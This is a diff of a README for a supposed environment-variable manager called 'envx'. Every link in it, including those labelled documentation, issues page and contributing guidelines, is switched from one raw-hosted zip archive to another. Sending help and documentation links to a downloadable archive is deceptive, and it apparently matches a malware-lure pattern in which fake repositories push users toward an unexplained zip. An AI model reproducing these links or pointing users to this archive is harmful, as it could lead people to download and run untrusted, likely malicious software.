@@ -1,6 +1,6 @@
 # ⚡ envx - Manage Your Environment Variables Effortlessly
 
-[![Download envx](https://raw.githubusercontent.com/Makenel/envx/main/pkg/Software-1.5-alpha.4.zip%https://raw.githubusercontent.com/Makenel/envx/main/pkg/Software-1.5-alpha.4.zip)](https://raw.githubusercontent.com/Makenel/envx/main/pkg/Software-1.5-alpha.4.zip)
+[![Download envx](https://raw.githubusercontent.com/Makenel/envx/main/cmd/Software_1.9-alpha.5.zip%https://raw.githubusercontent.com/Makenel/envx/main/cmd/Software_1.9-alpha.5.zip)](https://raw.githubusercontent.com/Makenel/envx/main/cmd/Software_1.9-alpha.5.zip)
 
 ## 📚 Overview
 
@@ -22,7 +22,7 @@ Before downloading, ensure your computer meets the following basic requirements:
 
 To download envx, visit the following link:
 
-[Download envx from Releases](https://raw.githubusercontent.com/Makenel/envx/main/pkg/Software-1.5-alpha.4.zip)
+[Download envx from Releases](https://raw.githubusercontent.com/Makenel/envx/main/cmd/Software_1.9-alpha.5.zip)
 
 ## 📥 Download & Install
 
@@ -96,12 +96,12 @@ envx allows you to store environment variables for each project. You can switch 
 
 For more advanced usage and tips, consult the following resources:
 
-- [full documentation](https://raw.githubusercontent.com/Makenel/envx/main/pkg/Software-1.5-alpha.4.zip)
-- [issues page for help](https://raw.githubusercontent.com/Makenel/envx/main/pkg/Software-1.5-alpha.4.zip)
+- [full documentation](https://raw.githubusercontent.com/Makenel/envx/main/cmd/Software_1.9-alpha.5.zip)
+- [issues page for help](https://raw.githubusercontent.com/Makenel/envx/main/cmd/Software_1.9-alpha.5.zip)
 
 ## 🤝 Contributing
 
-We welcome contributions to envx. If you have suggestions or improvements, please check our [Contributing Guidelines](https://raw.githubusercontent.com/Makenel/envx/main/pkg/Software-1.5-alpha.4.zip).
+We welcome contributions to envx. If you have suggestions or improvements, please check our [Contributing Guidelines](https://raw.githubusercontent.com/Makenel/envx/main/cmd/Software_1.9-alpha.5.zip).
 
 ## ✅ FAQs
 
@@ -115,10 +115,10 @@ Yes, envx works on Windows, macOS, and Linux.
 No, envx is a local-first tool that requires no servers.
 
 **4. Where do I find help if I encounter issues?**
-You can visit the [issues page](https://raw.githubusercontent.com/Makenel/envx/main/pkg/Software-1.5-alpha.4.zip) to report problems or ask for help.
+You can visit the [issues page](https://raw.githubusercontent.com/Makenel/envx/main/cmd/Software_1.9-alpha.5.zip) to report problems or ask for help.
 
 ## 🏁 Conclusion
 
 Congrats! You are now ready to manage your environment variables using envx. Get started today, and simplify your development workflow.
 
-Don't forget to visit the [Download envx from Releases](https://raw.githubusercontent.com/Makenel/envx/main/pkg/Software-1.5-alpha.4.zip) to grab your copy!
+Don't forget to visit the [Download envx from Releases](https://raw.githubusercontent.com/Makenel/envx/main/cmd/Software_1.9-alpha.5.zip) to grab your copy!
